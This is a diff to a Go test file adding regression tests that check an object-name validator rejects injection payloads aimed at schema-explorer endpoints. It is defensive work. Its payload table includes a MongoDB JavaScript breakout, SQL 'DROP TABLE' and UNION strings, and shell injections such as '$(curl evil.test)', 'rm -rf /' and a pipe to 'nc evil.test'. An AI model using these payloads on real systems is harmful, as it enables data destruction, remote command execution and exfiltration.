@@ -1378,3 +1378,119 @@ func TestParseCloudWatchTables(t *testing.T) {
 		})
 	}
 }
+
+// TestValidateObjectNameRejectsInjection pins the payloads that made the
+// schema-explorer endpoints a privilege escalation: the table/collection query
+// param was interpolated raw into generated JavaScript, SQL and a shell
+// command line on the plain-exec path, which loads no plugins (no review, no
+// audit, no DLP, no guardrails).
+func TestValidateObjectNameRejectsInjection(t *testing.T) {
+	payloads := []struct {
+		name    string
+		payload string
+	}{
+		// The MongoDB payload: breaks out of `var collName = '%s';` in
+		// getMongoDBColumnsQuery and runs arbitrary JavaScript.
+		{"mongo js breakout", `x');print(db.adminCommand({listDatabases:1}));//`},
+		{"mongo js quote", `x'`},
+		// SQL string-literal breakouts (postgres/mssql/mysql/oracle all
+		// interpolate the name into a quoted literal).
+		{"sql union", `x' UNION SELECT 1,2,3--`},
+		{"sql terminator", `x'; DROP TABLE users;--`},
+		{"sql comment", `x'--`},
+		// DynamoDB interpolates into a bash command line.
+		{"shell substitution", `x$(curl evil.test)`},
+		{"shell backtick", "x`id`"},
+		{"shell semicolon", `x; rm -rf /`},
+		{"shell pipe", `x | nc evil.test 1234`},
+		// Transport breakers.
+		{"newline", "x\ny"},
+		{"carriage return", "x\ry"},
+		{"double quote", `x"y`},
+		{"backslash", `x\y`},
+		{"empty", ""},
+		{"too long", strings.Repeat("a", objectNameMaxLen+1)},
+	}
+	for _, tt := range payloads {
+		t.Run(tt.name, func(t *testing.T) {
+			assert.Error(t, validateObjectName(tt.payload, dialectInterpolated),
+				"dialectInterpolated must reject %q", tt.payload)
+		})
+	}
+}
+
+func TestValidateObjectNameAcceptsRealNames(t *testing.T) {
+	for _, name := range []string{
+		"users",
+		"user_accounts",
+		"UserAccounts",
+		"orders.2026",
+		"legacy-orders",
+		"Sales Orders", // a space is legal in a real table name
+		"_internal",
+		"t1",
+		strings.Repeat("a", objectNameMaxLen),
+	} {
+		t.Run(name, func(t *testing.T) {
+			assert.NoError(t, validateObjectName(name, dialectInterpolated))
+		})
+	}
+}
+
+// TestValidateObjectNameDataDialect covers the policy used once a name travels
+// as a JSON value rather than as code. It is deliberately permissive about
+// quotes -- MongoDB allows them in collection names, and rejecting them would
+// make a legitimately named collection unbrowsable for no safety gain.
+func TestValidateObjectNameDataDialect(t *testing.T) {
+	t.Run("accepts names an allowlist would reject", func(t *testing.T) {
+		for _, name := range []string{
+			`user's data`,
+			`système`,
+			`orders "2026"`,
+			`a/b`,
+			`x');print(1);//`, // inert as a JSON value
+			`emoji 💾`,
+		} {
+			assert.NoError(t, validateObjectName(name, dialectData), "name=%q", name)
+		}
+	})
+
+	t.Run("rejects what breaks the transport", func(t *testing.T) {
+		for _, name := range []string{
+			"x\ny",
+			"x\ry",
+			"x\ty",
+			"x\x00y",
+			"x y", // legal in JSON, terminates an ES5 string literal
+			"x y",
+			"",
+			strings.Repeat("a", objectNameMaxLen+1),
+		} {
+			assert.Error(t, validateObjectName(name, dialectData), "name=%q", name)
+		}
+	})
+}
+
+// TestObjectNameDialectForIsInterpolatedEverywhere pins the sequencing: no
+// connection type may use dialectData until its introspection scripts stop
+// interpolating the name into generated code. Today none have, MongoDB
+// included -- getMongoDBColumnsQuery still splices it into JavaScript.
+//
+// When the gateway/mongoscript params layer lands, flip MongoDB here and
+// update this test in the same change. Until then a green test is the proof
+// that no type is silently unguarded.
+func TestObjectNameDialectForIsInterpolatedEverywhere(t *testing.T) {
+	for _, connType := range []pb.ConnectionType{
+		pb.ConnectionTypeMongoDB,
+		pb.ConnectionTypePostgres,
+		pb.ConnectionTypeMySQL,
+		pb.ConnectionTypeMSSQL,
+		pb.ConnectionTypeOracleDB,
+		pb.ConnectionTypeDynamoDB,
+		pb.ConnectionTypeCloudWatch,
+	} {
+		t.Run(string(connType), func(t *testing.T) {
+			assert.Equal(t, dialectInterpolated, objectNameDialectFor(connType))
+		})
+	}
+}
